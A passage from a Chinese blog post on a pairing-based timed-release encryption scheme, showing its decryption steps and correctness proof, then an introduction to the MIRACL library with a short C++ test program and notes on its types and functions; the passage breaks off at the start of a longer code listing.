class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span></span></span></span></p></li><li><p>给定密文<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mo>=</mo><mo>&lt;</mo><mi>U</mi><mo separator="true">,</mo><mi>V</mi><mo>&gt;</mo></mrow><annotation encoding="application/x-tex">C=&lt;U,V&gt;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7224em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span></span></span></span>，接收方在指定解密时间<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo>∈</mo><mo stretchy="false">{</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><msup><mo stretchy="false">}</mo><mo>∗</mo></msup></mrow><annotation encoding="application/x-tex">T\in \{0,1\}^*</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7224em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mclose"><span class="mclose">}</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span></span></span></span>，使用自己计算得到的时间陷门<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>U</mi><mi>T</mi></msub></mrow><annotation encoding="application/x-tex">U_T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>和时间服务器的时间陷门<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mi>T</mi></msub></mrow><annotation encoding="application/x-tex">S_T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，完成如下解密操作：</p><p>(1)计算<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>K</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>=</mo><mi>e</mi><mo stretchy="false">(</mo><mi>U</mi><mo separator="true">,</mo><msub><mi>S</mi><mi>T</mi></msub><mo>+</mo><msub><mi>U</mi><mi>T</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">K&#x27;=e(U,S_T+U_T)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7519em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></p><p>(2)计算<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi><mo>⊕</mo><msub><mi>H</mi><mn>2</mn></msub><mo stretchy="false">(</mo><msup><mi>K</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">V\oplus H_2(K&#x27;)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0019em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>恢复消息<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span></p></li></ol><h2 id="正确性证明">正确性证明</h2><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>K</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>=</mo><mi>e</mi><mo stretchy="false">(</mo><mi>U</mi><mo separator="true">,</mo><msub><mi>S</mi><mi>T</mi></msub><mo>+</mo><msub><mi>U</mi><mi>T</mi></msub><mo stretchy="false">)</mo><mo>=</mo><mi>e</mi><mo stretchy="false">(</mo><mi>r</mi><mi>P</mi><mo separator="true">,</mo><mo stretchy="false">(</mo><mi>u</mi><mo>+</mo><mi>s</mi><mo stretchy="false">)</mo><msub><mi>H</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>=</mo><mi>e</mi><mo stretchy="false">(</mo><mi>P</mi><mo separator="true">,</mo><msub><mi>H</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo><msup><mo stretchy="false">)</mo><mrow><mi>r</mi><mo stretchy="false">(</mo><mi>u</mi><mo>+</mo><mi>s</mi><mo stretchy="false">)</mo></mrow></msup><mo>=</mo><mi>K</mi></mrow><annotation encoding="application/x-tex">K&#x27;=e(U,S_T+U_T)=e(rP,(u+s)H_1(T))=e(P,H_1(T))^{r(u+s)}=K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8019em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8019em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mopen">(</span><span class="mord mathnormal">u</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">s</span><span class="mclose">)</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">))</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.188em;vertical-align:-0.25em;"></span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.938em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">u</span><span class="mbin mtight">+</span><span class="mord mathnormal mtight">s</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>V</mi><mo>⊕</mo><msub><mi>H</mi><mn>2</mn></msub><mo stretchy="false">(</mo><msup><mi>K</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo><mo>=</mo><mi>V</mi><mo>⊕</mo><msub><mi>H</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>K</mi><mo stretchy="false">)</mo><mo>=</mo><mi>M</mi><mo>⊕</mo><msub><mi>H</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>K</mi><mo stretchy="false">)</mo><mo>⊕</mo><msub><mi>H</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>K</mi><mo stretchy="false">)</mo><mo>=</mo><mi>M</mi></mrow><annotation encoding="application/x-tex">V\oplus H_2(K&#x27;)=V\oplus H_2(K)=M\oplus H_2(K)\oplus H_2(K)=M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0519em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8019em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span></span></p><h1 id="Miracl库">Miracl库</h1><p>MIRACL(Multiprecision Integer and Rational Arithmetic C/c++ Library)是一套由Shamus Software Ltd.所开发的一套关于大数运算函数库，用来设计与大数运算相关的密码学之应用，包含了RSA 公开密码学、Diffie-Hellman密钥交换(Key Exchange)、AES、DSA数字签名，还包含了较新的椭圆曲线密码学(Elliptic Curve Cryptography)等等。</p><p>Miracl库需要手动下载调用才能使用。</p><h2 id="Visual-Studio中使用Miracl库">Visual Studio中使用Miracl库</h2><p>可以参考这个教程：<a href="https://www.bilibili.com/read/cv7663799">https://www.bilibili.com/read/cv7663799</a></p><p>测试代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span><br>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;miracl.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mirdef.h&quot;</span></span><br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib,<span class="hljs-string">&quot;miracl.lib&quot;</span>)</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>miracl *mip = <span class="hljs-built_in">mirsys</span>(<span class="hljs-number">500</span>, <span class="hljs-number">16</span>); <span class="hljs-comment">//初始化miracl系统</span><br>big n = <span class="hljs-built_in">mirvar</span>(<span class="hljs-number">8</span>); <span class="hljs-comment">//初始化n,必须有</span><br><span class="hljs-built_in">cotnum</span>(n, stdout); <span class="hljs-comment">//打印n</span><br><span class="hljs-built_in">cinnum</span>(n, stdin); <span class="hljs-comment">//输入n</span><br><span class="hljs-built_in">cotnum</span>(n, stdout); <span class="hljs-comment">//再次打印n</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>能成功运行这个测试代码表示静态资源库编译完成并且成功导入。</p><h2 id="结构体说明">结构体说明</h2><ul><li>ECn：代表椭圆曲线上的点</li><li>Big：代表一个大整数</li><li>ZZn：表示大整数（大数）的数据类型。ZZn 提供了一个可以处理大数的抽象接口，使得在进行椭圆曲线密码学等计算时更加方便和高效。</li><li>ZZn2：二次扩展有限域上的元素，包含两个 ZZn元素，分别表示二次扩域中的实部和虚部。二次扩展域可看作加上虚数的椭圆曲线有限域。</li></ul><h2 id="函数说明">函数说明</h2><ul><li>map_to_point：对应公式中的H1</li><li>H1：将字符串哈希为一个大整数</li><li>H2：对应公式中的H2</li><li>ecap：双线性对运算，计算椭圆曲线上两个点 P 和 Q 的配对运算结果。</li></ul><h1 id="代码示例">代码示例</h1><h2 id="具体实现方案">具体实现方案</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span 